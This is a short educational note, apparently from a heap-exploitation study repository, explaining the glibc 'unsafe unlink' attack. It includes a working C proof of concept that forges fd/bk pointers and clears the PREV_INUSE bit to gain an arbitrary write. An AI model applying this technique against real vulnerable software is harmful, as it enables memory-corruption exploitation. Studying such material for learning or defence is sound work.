# Unsafe `unlink`
> LongChampion, 13/03/2020

The source code in this repository and an explantation at [Heap Exploitation](https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit.html) have descript all about this attack. So I will not try to make the description better here. Instead, I will write down some note about it:
- The size of chunk used in this attach must larger than MAX_FASTBIN_SIZE (0x80 on x64 system, 0x40 on x86 system)
- This is the fact that, field `pre_size` of the second chunk is belong to the first chunk, you can overwrite it freely.
- The `size` field of the second chunk is harder to control: it can't be directly access from both first chunk and second chunk. But we only want to set the last bit of `size` to zero, it can be easily done by an `off by one` error. However, in this case, the size of both chunk must be multiples of 0x100.
Look at my code:
```
#include <stdlib.h>
#include <unistd.h>

struct Chunk
{
    long long pre_size, size;
    struct Chunk *fd, *bk;
};

const long long SIZE = 0xf0;

int main()
{
    char data[8] = "Hello!";
    void *first = malloc(SIZE);
    void *second = malloc(SIZE);

    struct Chunk *FAKE = (struct Chunk *) first;
    FAKE->fd = (struct Chunk *) (&first - 3);
    FAKE->bk = (struct Chunk *) (&first - 2);

    struct Chunk *secondHeader = (struct Chunk *) (second - 2 * 8);
    secondHeader->pre_size = SIZE;
    secondHeader->size &= ~0xff;

    free(second);
    *(long long *) (first + 3 * 8) = (long long) &data;
    *(long long *) first = 0x0a2164656b636148;

    write(1, (char *) data, 8);
}
```
At this time, you can understand all the code above. I set `SIZE = 0xF0` so that when I call `malloc(SIZE)`, it will return a chunk of size 0x100. And when I clear the last byte of `size`:
> `secondHeader->size &= ~0xff;`

the `size` is changed from 0x101 to 0x100 (chunk size unchanged!)  
You can set `SIZE` to 0x1F0, 0x2F0, etc... and this code still print *Hacked!* to your screen.
